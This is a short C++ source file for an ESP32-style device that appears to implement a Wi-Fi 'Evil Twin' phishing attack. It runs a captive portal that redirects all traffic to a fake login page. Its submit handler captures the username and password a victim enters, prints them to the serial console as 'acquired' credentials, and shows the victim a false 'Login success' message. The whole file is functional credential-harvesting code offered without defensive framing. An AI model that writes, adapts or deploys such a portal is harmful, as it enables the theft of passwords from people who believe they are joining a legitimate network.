#include "web_handler.h"
#include "html_data.h"

#include <WiFi.h>
#include <WebServer.h>

void setup_web_handler() {
    http_server.on("/", main_handler);
    http_server.on("/submit", submit_handler);
    http_server.on("/shutdown", shutdown_handler);
    http_server.onNotFound(captive_portal);
}

void captive_portal() {   
    http_server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
    http_server.send(302, "text/plain", ""); 
}

void main_handler() {
    http_server.send(200, "text/html", login_page);
}

void submit_handler() {
    if (http_server.method() == HTTP_POST) {
        String username = http_server.arg("username");
        String password = http_server.arg("password");
    
        Serial.print("[CREDENTIALS] Acquired data: ");
        Serial.println("Username: ");
        Serial.print(username);
        Serial.println("Password: ");
        Serial.print(password);

        http_server.send(200, "text/plain", "Login success");
    } else {
        http_server.send(405, "text/plain", "Method Not Allowed");
    }
}

void shutdown_handler() {
    http_server.send(200, "text/plain", "Shutting down the Evil Twin...");
    delay(1000); 
    ESP.deepSleep(0); 
}
